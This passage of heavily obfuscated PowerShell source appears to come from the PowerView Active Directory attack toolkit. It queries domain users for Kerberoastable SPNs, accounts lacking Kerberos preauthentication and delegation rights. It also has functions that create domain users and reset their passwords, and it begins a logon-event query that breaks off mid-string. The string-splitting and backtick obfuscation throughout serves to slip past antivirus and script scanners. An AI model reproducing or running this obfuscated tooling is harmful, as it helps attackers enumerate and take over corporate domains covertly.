    [OutputType({"{3}{2}{4}{1}{0}"-f'aw','R','erV','Pow','iew.User.'})]
    [CmdletBinding(dEFAultpArAMEteRSETnAMe = {"{4}{1}{0}{3}{2}"-f 'leg','owDe','on','ati','All'})]
    Param(
        [Parameter(PosiTiON = 0, VAluefROMpIPELINE = ${Tr`UE}, ValUeFrOMPiPeliNEbyPropERTYNAmE = ${t`RuE})]
        [Alias({"{0}{1}{2}{3}"-f 'Di','st','ing','uishedName'}, {"{2}{0}{1}" -f'am','AccountName','S'}, {"{0}{1}"-f 'N','ame'}, {"{2}{3}{5}{4}{1}{0}"-f'me','ishedNa','Membe','rDis','u','ting'}, {"{0}{2}{1}" -f 'Member','e','Nam'})]
        [String[]]
        ${I`denT`ity},

        [Switch]
        ${S`pN},

        [Switch]
        ${ad`min`cou`NT},

        [Parameter(paraMETeRsetnaME = "A`l`lowDELe`GATI`ON")]
        [Switch]
        ${A`l`LowdElegAtIOn},

        [Parameter(PaRameteRSetNAme = "d`ISal`LO`Wd`elegA`TioN")]
        [Switch]
        ${DI`S`AlLOwDElegAti`On},

        [Switch]
        ${TR`UsteDto`AU`Th},

        [Alias({"{7}{4}{2}{1}{0}{6}{5}{3}" -f 're','P','os','d','erber','e','authNotRequir','K'}, {"{2}{0}{1}" -f 'oPreau','th','N'})]
        [Switch]
        ${pREA`UthN`o`TrE`QuiRed},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${lDap`FI`lteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ro`pe`RTiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Path','ADS'})]
        [String]
        ${SEA`RC`h`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{4}{3}{2}" -f 'ma','Do','ler','ntrol','inCo'})]
        [String]
        ${SErv`Er},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{2}{1}{0}" -f'eLevel','n','O'}, {"{1}{0}{2}"-f'ubt','S','ree'})]
        [String]
        ${SEa`RCHSC`opE} = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`E`SUl`TPa`gesize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVErt`i`M`eLI`Mit},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{0}{1}"-f'Gro','up'}, {"{1}{0}" -f 'ne','No'}, {"{0}{1}"-f'Owne','r'}, {"{0}{1}"-f'S','acl'})]
        [String]
        ${sE`CuRit`ym`ASks},

        [Switch]
        ${toM`BstO`Ne},

        [Alias({"{1}{3}{2}{0}" -f'nOne','Re','ur','t'})]
        [Switch]
        ${FIn`dOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RED`ENTi`Al} =   $0DSqR::"EM`Pty",

        [Switch]
        ${r`Aw}
    )

    DynamicParam {
        ${UAc`ValUe`Na`mEs} =   (gi  ("VaRiAB"+"L"+"e:W"+"QeG")  ).vaLuE::("{1}{0}{2}" -f 'tN','Ge','ames').Invoke(${ua`cEN`Um})
        
        ${u`ACValue`Nam`Es} = ${uAcV`ALUENA`mES} | &("{1}{2}{0}" -f'bject','ForEach','-O') {${_}; "NOT_$_"}
        
        &("{2}{3}{1}{0}{4}"-f'na','Dy','New','-','micParameter') -Name ("{1}{2}{0}" -f'Filter','UA','C') -ValidateSet ${uA`cVAl`Ue`NA`Mes} -Type ([array])
    }

    BEGIN {
        ${sE`Ar`CHeRArgu`M`eNts} = @{}
        if (${P`sbOUnD`PAramET`E`Rs}[("{1}{0}"-f'in','Doma')]) { ${SeaR`C`HEr`Ar`g`UmENts}[("{0}{1}"-f 'Doma','in')] = ${dO`ma`iN} }
        if (${psbound`pARAm`ET`eRs}[("{2}{0}{1}" -f 'ert','ies','Prop')]) { ${S`EARchE`RA`RGU`ME`Nts}[("{1}{0}{2}"-f'operti','Pr','es')] = ${PR`o`p`ErTies} }
        if (${ps`B`oUNDP`ARAMeTErs}[("{3}{1}{0}{2}"-f'archBas','e','e','S')]) { ${sEarCH`erA`Rgu`Me`N`Ts}[("{0}{1}{2}" -f'Se','archB','ase')] = ${seArc`Hb`A`se} }
        if (${P`sbO`UNDParam`ET`Ers}[("{1}{2}{0}"-f'er','Se','rv')]) { ${Se`ARCHeRa`RguM`enTs}[("{0}{1}"-f'Ser','ver')] = ${SE`RV`ER} }
        if (${psBo`UNdp`A`RameT`Ers}[("{3}{2}{1}{0}"-f 'e','hScop','earc','S')]) { ${S`EA`RcH`e`RAr`GumeNTS}[("{0}{2}{1}" -f 'Sear','cope','chS')] = ${sE`ARcHsC`OpE} }
        if (${Ps`Bo`UND`parAm`eTErs}[("{2}{1}{0}"-f'eSize','tPag','Resul')]) { ${sE`AR`ChERa`RgUmE`NTs}[("{4}{3}{2}{1}{0}"-f'e','iz','S','age','ResultP')] = ${ReSUl`T`pAGesIZE} }
        if (${ps`BOunDP`A`RamEt`ers}[("{2}{1}{0}" -f'rTimeLimit','rve','Se')]) { ${s`e`ArcHe`RarGUMEn`Ts}[("{3}{1}{0}{2}{4}"-f'me','rTi','Lim','Serve','it')] = ${SERVer`T`I`MeLimit} }
        if (${p`SBO`UNd`para`mETErs}[("{2}{0}{3}{1}" -f 'cur','sks','Se','ityMa')]) { ${SEA`RchEra`RGu`m`enTS}[("{2}{1}{3}{0}"-f 'asks','r','Secu','ityM')] = ${sEcuR`ity`M`ASks} }
        if (${pSbou`NdPa`R`AmeTERS}[("{1}{0}{2}"-f'to','Tombs','ne')]) { ${s`e`ARc`herA`RGU`MeNTs}[("{0}{1}{2}" -f 'Tomb','s','tone')] = ${t`ombsto`NE} }
        if (${PS`BoUND`P`ARAM`eTErs}[("{2}{0}{1}"-f'red','ential','C')]) { ${SearcH`ERArG`UMe`NTS}[("{2}{0}{1}"-f'eden','tial','Cr')] = ${Cr`EDeN`TiaL} }
        ${uSeRS`Ea`RCH`eR} = &("{3}{0}{4}{2}{1}"-f'ainSear','er','h','Get-Dom','c') @SearcherArguments
    }

    PROCESS {
        
        if (${PSbou`ND`pA`R`Am`EtErs} -and (${p`s`BOu`NDP`ARAmEterS}."C`oUNT" -ne 0)) {
            &("{6}{5}{1}{0}{4}{2}{3}"-f'a','namicPar','te','r','me','-Dy','New') -CreateVariables -BoundParameters ${pSbOu`Nd`PAr`AM`ETe`Rs}
        }

        if (${u`sErs`EARc`hER}) {
            ${iDe`NT`i`TYfil`TEr} = ''
            ${FILT`eR} = ''
            ${Ide`NtIty} | &("{3}{1}{0}{2}"-f 'ec','Obj','t','Where-') {${_}} | &("{0}{1}{3}{2}" -f 'ForEac','h','t','-Objec') {
                ${IDE`NT`iTyiNs`TANCE} = ${_}.("{1}{0}{2}" -f 'ep','R','lace').Invoke('(', '\28').("{0}{1}" -f'Replac','e').Invoke(')', '\29')
                if (${IDENTit`YiNStA`N`Ce} -match ("{0}{1}" -f'^S','-1-')) {
                    ${iD`entit`Y`FIlTER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IDEN`TITY`I`N`S`Tance} -match ("{1}{0}"-f'=','^CN')) {
                    ${ID`e`NtItYf`IlT`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSBOUnDpaRAME`T`E`Rs}[("{1}{0}" -f 'omain','D')]) -and (-not ${pS`B`oU`N`DparA`MetERs}[("{0}{2}{1}"-f'Search','e','Bas')])) {
                        
                        
                        ${iDE`N`T`IT`yDomAIn} = ${iDENT`ityi`Ns`TaNCE}.("{0}{2}{1}{3}" -f 'S','S','ub','tring').Invoke(${IDeNTit`yi`Nst`AnCE}.("{2}{0}{1}"-f 'dexO','f','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{3}{4}{2}{0}"-f 'se','Write-','o','Ve','rb') ('[Ge'+'t-D'+'o'+'mainU'+'ser]'+' '+'E'+'xtracte'+'d '+'dom'+'a'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${s`E`ARCHEr`ARguments}[("{0}{1}" -f'D','omain')] = ${ID`e`NTiTY`DO`maIN}
                        ${UsE`RsEAr`CHer} = &("{3}{4}{2}{0}{1}" -f 'arche','r','ainSe','G','et-Dom') @SearcherArguments
                        if (-not ${Us`E`RSEAr`cHer}) {
                            &("{0}{2}{1}{3}" -f'Write','arn','-W','ing') ('[Get-D'+'om'+'ai'+'nUser]'+' '+'Un'+'ab'+'le '+'t'+'o '+'retri'+'ev'+'e '+'do'+'ma'+'in '+'searc'+'her '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${iDEnti`TYI`N`sTaNce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${GUi`dBYtE`STR`iNG} = (([Guid]${ID`enTItyINSt`A`N`Ce}).("{0}{1}{3}{2}"-f'T','o','ay','ByteArr').Invoke() | &("{0}{2}{1}{3}" -f 'ForEac','c','h-Obje','t') { '\' + ${_}.("{2}{1}{0}"-f'ng','tri','ToS').Invoke('X2') }) -join ''
                    ${I`De`N`TI`TYFiLtEr} += "(objectguid=$GuidByteString)"
                }
                elseif (${iDE`N`TIT`YiN`S`TanCe}.("{2}{0}{1}"-f 'n','tains','Co').Invoke('\')) {
                    ${cON`V`ert`EdI`DeNTI`TYi`NStAN`CE} = ${IDeNTItY`I`Ns`TAN`cE}.("{1}{0}"-f 'lace','Rep').Invoke('\28', '(').("{0}{1}" -f 'R','eplace').Invoke('\29', ')') | &("{3}{2}{1}{0}" -f 'me','Na','AD','Convert-') -OutputType ("{2}{0}{1}" -f 'ca','l','Canoni')
                    if (${coN`VE`R`T`EdIdENTI`TYinst`A`NCe}) {
                        ${UsErD`Om`Ain} = ${C`oNV`E`R`TedI`dEN`TITYi`NsT`ANCE}.("{0}{2}{1}"-f'SubStr','ng','i').Invoke(0, ${cOnVErT`ed`i`dE`NTItY`Ins`T`ANCE}.("{0}{1}"-f 'IndexO','f').Invoke('/'))
                        ${u`S`ErNAME} = ${i`DE`NTITY`iN`StANCe}.("{0}{1}"-f'Sp','lit').Invoke('\')[1]
                        ${i`dEnTI`TY`FILTEr} += "(samAccountName=$UserName)"
                        ${SE`A`R`chEra`RGU`meNTs}[("{0}{1}"-f'Domai','n')] = ${U`SerDO`MaIN}
                        &("{1}{0}{2}" -f'-Verb','Write','ose') ('[Get'+'-'+'Do'+'mainUser]'+' '+'Ext'+'r'+'ac'+'ted '+'domain'+' '+"'$UserDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${USeRSe`Ar`C`her} = &("{2}{0}{1}{3}" -f'omai','nSear','Get-D','cher') @SearcherArguments
                    }
                }
                else {
                    ${I`dE`NtITYF`iL`Ter} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${ide`NtITYF`ILt`er} -and (${iDENTiT`Y`F`IL`TER}.("{0}{1}"-f 'T','rim').Invoke() -ne '') ) {
                ${fIL`TEr} += "(|$IdentityFilter)"
            }

            if (${pSboUn`DPaRAm`Ete`Rs}['SPN']) {
                &("{0}{2}{1}" -f 'Write-','bose','Ver') ("{8}{0}{4}{9}{10}{5}{11}{6}{1}{2}{7}{3}" -f 'et-D','non-null',' service principal ','s','om','er] Sea','for ','name','[G','ai','nUs','rching ')
                ${f`i`ltEr} += (("{7}{6}{5}{1}{3}{0}{4}{2}"-f 'am','ePrinc','*)','ipalN','e=','ic','erv','(s'))
            }
            if (${PSBOU`ND`ParAmeT`eRs}[("{1}{0}{2}{4}{3}"-f'owDeleg','All','a','n','tio')]) {
                &("{1}{0}{3}{2}" -f 't','Wri','rbose','e-Ve') ("{7}{3}{2}{0}{6}{4}{5}{8}{9}{1}" -f 'ng for users wh','egated','i','omainUser] Search',' ','can ','o','[Get-D','be d','el')
                
                ${fIL`TEr} += ((("{4}{0}{8}{1}{2}{6}{5}{7}{3}"-f 'AccountControl:1','.','4','))','(!(user','3:=10485','.80','74','.2.840.113556.1')))
            }
            if (${p`sB`O`UN`DPaRa`mETers}[("{2}{3}{1}{0}"-f 'ion','legat','Di','sallowDe')]) {
                &("{0}{1}{2}" -f 'Wri','te-V','erbose') ("{19}{0}{12}{1}{5}{17}{8}{4}{3}{15}{16}{2}{13}{9}{18}{10}{14}{11}{7}{6}" -f 't','om',' who ar','] Sear','r','ai','legation','e','se','e','o','d','-D','e s','r ','c','hing for users','nU','nsitive and not trusted f','[Ge')
                ${FIl`TER} += ("{4}{3}{11}{2}{8}{10}{1}{12}{0}{5}{7}{6}{9}" -f'6.','35','l','userAccountCon','(','1.4.','3:','80',':1.','=1048574)','2.840.11','tro','5')
            }
            if (${PsB`oU`N`DpA`RAmETErs}[("{1}{0}{2}" -f'o','AdminC','unt')]) {
                &("{3}{0}{2}{1}" -f 'rite-V','e','erbos','W') ("{10}{8}{0}{9}{6}{3}{11}{7}{4}{1}{5}{2}{12}" -f'D','r ad','o','User]','fo','minC','main',' ','Get-','o','[',' Searching','unt=1')
                ${F`ilt`Er} += ("{0}{2}{1}" -f'(adm','t=1)','incoun')
            }
            if (${Ps`BoUnDpa`RA`Me`Te`Rs}[("{0}{2}{1}{3}" -f 'Trus','oA','tedT','uth')]) {
                &("{2}{0}{1}{3}"-f'rit','e-V','W','erbose') ("{9}{0}{3}{10}{7}{8}{5}{11}{2}{1}{14}{4}{13}{6}{12}" -f'inUs',' ','e','e','uthenticat','for u',' for',' ','Searching ','[Get-Doma','r]','sers that ar',' other principals','e','trusted to a')
                ${f`i`lTER} += (("{5}{4}{2}{6}{7}{1}{3}{0}"-f')','ele','l','gateto=*','sds-al','(m','owe','dtod'))
            }
            if (${pSB`oUN`DpArAmE`T`ERS}[("{3}{0}{2}{1}"-f 'reauthNo','equired','tR','P')]) {
                &("{3}{2}{1}{0}{4}"-f 'erbo','V','rite-','W','se') ("{5}{2}{10}{4}{7}{1}{12}{8}{0}{11}{3}{16}{6}{14}{15}{13}{9}" -f'quire ke','unts that do','Get-DomainUs','ro',' Searc','[','t','hing for user acco','not re','e','er]','rbe',' ','t','henti','ca','s preau')
                ${fIlt`ER} += (("{11}{4}{2}{10}{5}{6}{3}{0}{1}{7}{9}{8}" -f'0.113','556.1.4.80','o','4','serAcc','tCon','trol:1.2.8','3:=41943','4)','0','un','(u'))
            }
            if (${P`SboundP`AR`A`m`eTeRS}[("{1}{2}{0}" -f'er','LDAPF','ilt')]) {
                &("{2}{1}{3}{0}"-f'ose','rite-Ver','W','b') ('[G'+'et-'+'Domain'+'U'+'ser] '+'Using'+' '+'ad'+'dition'+'al '+'LD'+'AP '+'fi'+'lter: '+"$LDAPFilter")
                ${fIl`TER} += "$LDAPFilter"
            }

            
            ${UAC`F`Il`TER} | &("{0}{1}{2}"-f'Where','-O','bject') {${_}} | &("{1}{0}{2}" -f 'Each-O','For','bject') {
                if (${_} -match ("{1}{0}" -f'T_.*','NO')) {
                    ${UA`c`FiELD} = ${_}.("{0}{1}{2}"-f'Substri','n','g').Invoke(4)
                    ${u`AcValUE} = [Int](${uace`N`Um}::${UACFi`e`lD})
                    ${f`iltER} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uacvaL`Ue} = [Int](${uaCe`N`UM}::${_})
                    ${filt`er} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${U`S`eRSEA`Rc`her}."Fi`LtEr" = "(&(samAccountType=805306368)$Filter)"
            &("{3}{0}{2}{1}"-f'Ve','se','rbo','Write-') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${Ps`BOUN`Dp`A`R`AmetERS}[("{0}{1}" -f'Fin','dOne')]) { ${rEsU`L`TS} = ${US`ERSe`A`Rch`er}.("{1}{0}{2}"-f'indO','F','ne').Invoke() }
            else { ${rES`U`LTS} = ${user`Se`ARCHeR}.("{0}{1}{2}" -f'Fi','n','dAll').Invoke() }
            ${REs`U`lts} | &("{1}{2}{0}{3}" -f'Ob','Wh','ere-','ject') {${_}} | &("{3}{0}{4}{1}{2}"-f'rEa','O','bject','Fo','ch-') {
                if (${pS`B`Oun`d`Par`AMeTERs}['Raw']) {
                    
                    ${u`SeR} = ${_}
                    ${us`er}."PS`oBj`ECT"."t`Yp`enames".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{2}{0}{1}{3}" -f'erV','iew.','Pow','User.Raw'))
                }
                else {
                    ${us`eR} = &("{2}{1}{0}{3}{5}{4}" -f 'rt-LD','nve','Co','AP','ty','Proper') -Properties ${_}."p`RoPerTI`ES"
                    ${us`Er}."Pso`BjECT"."T`yP`eNamEs".("{1}{0}" -f 'sert','In').Invoke(0, ("{1}{0}{2}{3}" -f'ie','PowerV','w.','User'))
                }
                ${Us`er}
            }
            if (${rEsU`ltS}) {
                try { ${rEsu`L`Ts}.("{2}{0}{1}" -f 'p','ose','dis').Invoke() }
                catch {
                    &("{0}{3}{1}{2}"-f 'Writ','bo','se','e-Ver') ('[G'+'et-DomainU'+'ser]'+' '+'Erro'+'r '+'disp'+'o'+'si'+'ng '+'o'+'f '+'th'+'e '+'Resu'+'lt'+'s '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${uSeRS`EAr`CheR}.("{1}{2}{0}"-f 'pose','di','s').Invoke()
        }
    }
}


function NEw-`DoM`A`In`USer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{6}{5}{7}{2}{4}" -f 'hou','PSUseS','ngingFunctio','ldProcessFor','ns','ateC','St','ha'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'ldPr','PSShou','ess','oc'}, '')]
    [OutputType({"{9}{4}{7}{8}{0}{3}{5}{6}{1}{2}"-f 'ces','rinc','ipal','.A','to','ccountMana','gement.UserP','ry','Servi','Direc'})]
    Param(
        [Parameter(MAndaTORY = ${tR`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${Sa`Ma`Cco`UnTnA`mE},

        [Parameter(mandaTOrY = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'Pa','sswo','rd'})]
        [Security.SecureString]
        ${aC`cO`U`NtpASSw`Ord},

        [ValidateNotNullOrEmpty()]
        [String]
        ${na`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`I`sPla`Yname},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`escr`ipTiON},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`om`Ain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`e`N`TIaL} =   $0dsqr::"EmP`TY"
    )

    ${cOnT`eXTaR`G`U`MENTS} = @{
        ("{1}{0}{2}" -f 'den','I','tity') = ${s`Amac`cOun`Tna`ME}
    }
    if (${pSbOU`N`DpaRaMe`Te`RS}[("{0}{1}"-f 'D','omain')]) { ${CONT`e`xtArg`U`Men`Ts}[("{0}{1}" -f 'Domai','n')] = ${dO`mA`In} }
    if (${pSb`o`UNdpAraMe`T`eRS}[("{3}{1}{2}{0}"-f'ial','d','ent','Cre')]) { ${Co`Nt`EXtArG`U`MEnts}[("{0}{2}{3}{1}" -f'Cr','l','ed','entia')] = ${crE`Denti`Al} }
    ${C`ONT`EXT} = &("{0}{2}{1}{3}"-f'Get-Prin','x','cipalConte','t') @ContextArguments

    if (${CO`NtE`Xt}) {
        ${uS`eR} = &("{2}{1}{0}{3}"-f 'e','bj','New-O','ct') -TypeName ("{3}{9}{10}{8}{0}{7}{2}{11}{6}{1}{4}{5}" -f 'ir','ntManagem','Ser','S','ent','.UserPrincipal','ices.Accou','ectory','m.D','y','ste','v') -ArgumentList (${c`oNtEXT}."COn`T`ExT")

        
        ${u`sER}."sa`M`Ac`counTname" = ${Con`TE`XT}."iD`EN`TItY"
        ${tEM`Pcr`ed} = &("{3}{1}{2}{0}" -f 'ct','w-','Obje','Ne') ("{2}{1}{5}{9}{0}{4}{7}{8}{3}{6}"-f'Man','t','Sys','on.PSCredenti','agem','em','al','ent.Au','tomati','.')('a', ${Ac`CoUntp`As`sw`ord})
        ${Us`eR}.("{1}{2}{0}"-f'd','SetPas','swor').Invoke(${Te`mPc`R`ed}.("{0}{3}{5}{2}{4}{1}"-f 'G','l','Cre','etNetw','dentia','ork').Invoke()."P`A`SSWOrd")
        ${US`er}."E`NaBleD" = ${T`RUe}
        ${us`Er}."p`AsSw`OrdN`oTrEq`UIR`ED" = ${fa`LSe}

        if (${ps`Bo`UNDPaR`AmeT`erS}[("{0}{1}"-f'Na','me')]) {
            ${us`Er}."nA`me" = ${nA`me}
        }
        else {
            ${uS`eR}."N`Ame" = ${co`NT`ExT}."IdeN`TI`Ty"
        }
        if (${Ps`Boun`Dpar`AM`ET`ERs}[("{2}{1}{0}" -f 'me','splayNa','Di')]) {
            ${U`sEr}."DISP`l`A`YNAMe" = ${D`IsPLay`N`AME}
        }
        else {
            ${US`eR}."dIS`P`layNAme" = ${C`onTE`xt}."IDe`NT`ity"
        }

        if (${Ps`BouNdPARaM`ETE`Rs}[("{2}{1}{0}" -f'n','riptio','Desc')]) {
            ${Us`eR}."De`scR`IptIOn" = ${d`EScri`PTIon}
        }

        &("{1}{0}{2}" -f'ite-Ve','Wr','rbose') ('[Ne'+'w-'+'Doma'+'i'+'nUse'+'r] '+'Atte'+'mptin'+'g '+'to'+' '+'cr'+'e'+'ate '+'user'+' '+"'$SamAccountName'")
        try {
            ${N`ULL} = ${Us`er}.("{1}{0}"-f 'e','Sav').Invoke()
            &("{2}{1}{4}{0}{3}"-f'o','it','Wr','se','e-Verb') ('['+'New'+'-D'+'oma'+'inUs'+'er] '+'U'+'ser '+"'$SamAccountName' "+'succ'+'essfully'+' '+'cr'+'eat'+'ed')
            ${U`sER}
        }
        catch {
            &("{2}{0}{1}{3}" -f'e-Warn','in','Writ','g') ('[New'+'-Dom'+'ai'+'nU'+'ser] '+'Er'+'r'+'or '+'cr'+'eating'+' '+'us'+'er '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function SEt-D`Om`AiNusE`Rp`AssworD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{1}{4}{2}{7}{3}{0}{6}" -f'gi','h','dProcessForStat','an','oul','PSUseS','ngFunctions','eCh'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}" -f'PSShoul','roc','dP','ess'}, '')]
    [OutputType({"{6}{3}{4}{8}{2}{1}{7}{0}{5}" -f 'nt.UserPrinc','e','es.AccountManag','yS','erv','ipal','Director','me','ic'})]
    Param(
        [Parameter(posItIon = 0, maNdatorY = ${tr`Ue})]
        [Alias({"{1}{2}{0}" -f'me','Us','erNa'}, {"{0}{2}{1}"-f 'U','erIdentity','s'}, {"{1}{0}"-f 'ser','U'})]
        [String]
        ${I`dE`Nti`TY},

        [Parameter(mANdATORY = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'ord','sw','Pas'})]
        [Security.SecureString]
        ${a`CC`ounTP`ASSworD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOm`AiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDeNt`I`AL} =   $0dSqR::"EMp`TY"
    )

    ${cOnt`ex`TAr`G`Ume`NTs} = @{ ("{0}{1}"-f'Iden','tity') = ${iDe`N`Ti`TY} }
    if (${psBOu`NdP`Ar`AMeTers}[("{1}{0}"-f 'omain','D')]) { ${Con`TEXTargu`MeN`TS}[("{0}{2}{1}"-f 'Doma','n','i')] = ${D`oMain} }
    if (${psbou`ND`P`ARaMe`Te`Rs}[("{2}{0}{1}" -f 'redentia','l','C')]) { ${C`oNtEXt`ArguM`eNTS}[("{0}{2}{3}{1}" -f 'C','al','r','edenti')] = ${C`REd`EN`TIal} }
    ${CO`Nt`Ext} = &("{0}{4}{1}{3}{2}" -f 'Get-Pr','ip','t','alContex','inc') @ContextArguments

    if (${cO`N`TExt}) {
        ${u`Ser} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{2}{3}{4}{1}{0}"-f'tity','en','Fi','ndByI','d').Invoke(${c`oNT`exT}."CoN`T`Ext", ${iDe`Nti`Ty})

        if (${US`Er}) {
            &("{3}{0}{1}{2}" -f'Ve','rbo','se','Write-') ('[Set'+'-Dom'+'ai'+'n'+'Us'+'erPass'+'wor'+'d] '+'At'+'te'+'mp'+'ting '+'t'+'o '+'set'+' '+'t'+'he '+'pa'+'sswor'+'d '+'f'+'or '+'us'+'er '+"'$Identity'")
            try {
                ${TE`mp`CRed} = &("{2}{1}{0}"-f't','-Objec','New') ("{11}{1}{2}{9}{5}{6}{4}{0}{8}{10}{3}{7}" -f 'ti','ystem.Manage','m','ed','a','nt.','Autom','ential','on.','e','PSCr','S')('a', ${aCCOu`N`Tpass`Wo`Rd})
                ${US`ER}.("{0}{1}{2}"-f 'S','etPassw','ord').Invoke(${TeM`pc`ReD}.("{2}{3}{0}{1}"-f'tNetworkCr','edential','G','e').Invoke()."pA`ssw`ord")

                ${N`Ull} = ${uS`er}.("{0}{1}"-f'S','ave').Invoke()
                &("{3}{1}{4}{0}{2}"-f 'erb','ite','ose','Wr','-V') ('[S'+'et-Do'+'mainUserP'+'as'+'swo'+'r'+'d] '+'Pass'+'w'+'o'+'rd '+'f'+'or '+'user'+' '+"'$Identity' "+'succ'+'essfu'+'l'+'ly'+' '+'re'+'set')
            }
            catch {
                &("{4}{0}{1}{2}{3}" -f 'rite','-','War','ning','W') ('[Set-Domai'+'nUserPa'+'s'+'s'+'word]'+' '+'Err'+'or '+'se'+'tt'+'ing '+'p'+'a'+'ssword '+'for'+' '+'use'+'r '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{0}{1}{2}" -f 'Write-W','a','rning') ('[Se'+'t-Dom'+'ainUse'+'rPasswo'+'r'+'d]'+' '+'Una'+'ble '+'t'+'o '+'fin'+'d '+'use'+'r '+"'$Identity'")
        }
    }
}


function Get-DoMA`IN`UsE`ReVEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'hould','PSS','Proces','s'}, '')]
    [OutputType({"{3}{2}{0}{1}{4}"-f 'e','rView.LogonEve','ow','P','nt'})]
    [OutputType({"{2}{1}{8}{6}{3}{5}{4}{10}{0}{7}{9}"-f 'lici','ow','P','w','Ex','.','ie','tC','erV','redentialLogonEvent','p'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIon = 0, VAluEfrOMPiPElinE = ${tR`Ue}, VAlueFroMPIPeLInEByPROpeRtynaMe = ${T`RUE})]
        [Alias({"{0}{2}{1}"-f 'dnsho','ame','stn'}, {"{0}{1}"-f'Ho','stName'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmP`U`TE`Rn`AMe} = ${en`V:cOMpUtE`Rna`me},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${st`Ar`TTIME} =  (  VARiaBLe  2pfHU4  ).ValUe::"N`oW".("{0}{1}" -f'Add','Days').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${eN`DTIMe} =   ( VArIABle ('2P'+'fhu'+'4') -VAlUE)::"n`oW",

        [ValidateRange(1, 1000000)]
        [Int]
        ${maX`e`V`EntS} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`dentIal} =   $0DSQr::"emP`Ty"
    )

    BEGIN {
        
        ${X`Pa`THfil`Ter} = (('bw'+'p'+'
'+'<Qu'+'e'+'ry'+'List>
 ')."rEP`LacE"(([cHaR]98+[cHaR]119+[cHaR]112),[StrIng][cHaR]34)+' '+' '+' '+'<Q'+'uery '+('Id={0}0'+'{0} ')-F  [ChaR]34+('Path'+'={0'+'}S'+'ecurity{0}'+'>
'+'
 ')-f[ChAr]34+' '+' '+' '+' '+' '+' '+' '+'<'+'!-- '+'Logo'+'n '+'eve'+'nt'+'s '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'Select'+' '+(('P'+'ath=b6'+'sS'+'e'+'curi'+'tyb'+'6s>
 ')  -CREpLaCE  ([cHAR]98+[cHAR]54+[cHAR]115),[cHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syst'+'em['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ovider'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Na'+'me'+'=Kv6Micros'+'o'+'ft-Wi'+'nd'+'ow'+'s-S'+'ecurity-Au'+'di'+'tingKv6
 ')-CREPLaCE ([chaR]75+[chaR]118+[chaR]54),[chaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(Lev'+'el=4 '+'or'+' '+'Level='+'0)'+' '+'and'+' '+'(Even'+'tID'+'=4'+'624)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'TimeCreat'+'ed['+'
